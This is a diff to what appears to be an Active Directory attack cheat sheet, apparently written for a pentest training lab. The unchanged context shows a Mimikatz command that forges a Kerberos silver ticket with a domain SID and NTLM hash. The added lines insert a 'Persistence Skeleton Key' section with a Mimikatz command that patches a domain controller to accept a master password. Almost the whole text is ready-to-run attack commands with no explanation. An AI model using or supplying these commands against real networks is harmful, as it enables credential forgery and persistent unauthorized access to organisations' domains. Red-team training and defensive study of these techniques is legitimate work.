@@ -214,3 +214,10 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporat
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'    #Silver Ticket for service HOST
 ```
+
+# Persistence Skeleton Key
+
+- **Invoke-Mimikatz:**
+```
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.dollarcorp.moneycorp.local    #Command to inject a skeleton key
+```
